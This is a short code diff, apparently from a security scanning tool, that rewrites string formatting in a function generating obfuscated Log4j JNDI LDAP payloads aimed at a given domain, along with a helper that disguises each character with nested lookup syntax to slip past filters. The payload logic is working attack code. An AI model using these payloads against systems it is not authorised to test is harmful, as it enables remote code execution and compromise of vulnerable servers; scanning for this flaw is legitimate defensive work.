@@ -4,7 +4,7 @@ from xing.utils import random_choices
 
 
 def gen_log4j_payload(domain, payload_type=random_choices(4)):
-    chars = "${{jndi:ldap://{0}/{1}}}".format(domain, payload_type)
+    chars = f"${{jndi:ldap://{domain}/{payload_type}}}"
     lst = []
     for char in chars:
         use = not getrandbits(1)
@@ -29,4 +29,4 @@ def confuse_chars(char):
         lst.append(garbageWord)
         lst.append(":")
         garbage = ''.join(lst)
-    return "${{{0}-{1}}}".format(garbage, char)
+    return f"${{{garbage}-{char}}}"
